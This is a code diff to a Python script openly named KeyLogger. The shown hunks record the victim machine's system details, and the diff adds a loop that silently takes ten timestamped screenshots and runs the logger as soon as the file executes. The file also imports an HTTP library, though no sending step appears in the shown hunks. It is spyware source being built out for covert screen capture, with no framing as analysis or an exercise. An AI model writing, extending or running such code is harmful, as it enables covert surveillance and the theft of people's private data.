@@ -5,11 +5,15 @@ import requests
 from PIL import ImageGrab
 from pathlib import Path
 import os
+import time
+from datetime import datetime
 
 
 LOGGER_OUTPUT = "logger.txt"
 COMPUTER_INFORMATION = "computer_information.txt"
 SCREENSHOT_DIRECTORY = "screenshots"
+SCREENSHOT_COUNT = 10
+SCREENSHOT_INTERVAL = 1
 
 if not os.path.exists("screenshots"):
     os.mkdir("screenshots")
@@ -40,10 +44,21 @@ class KeyLogger:
             f.write(f'Operating System: {platform.system()} {platform.version()}\n')
             f.write(f'Processor: {platform.processor()}\n')
 
-    def take_screenshot(self):
+    def make_screenshot(self):
         screenshot = ImageGrab.grab()
-        screenshot.save(f"{Path(__file__).parent.joinpath(self.SCREENSHOT_DIRECTORY)}/screenshot.png")
+        screenshot.save(f"{Path(__file__).parent.joinpath(self.SCREENSHOT_DIRECTORY)}/{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}_screenshot.png")
     
     def run(self):
         self.get_computer_information()
         self.take_screenshot()
+
+    def take_screenshot(self):
+        for i in range(SCREENSHOT_COUNT):
+            self.make_screenshot()
+            time.sleep(SCREENSHOT_INTERVAL)
+
+
+keylogger = KeyLogger()
+
+keylogger.run()
+
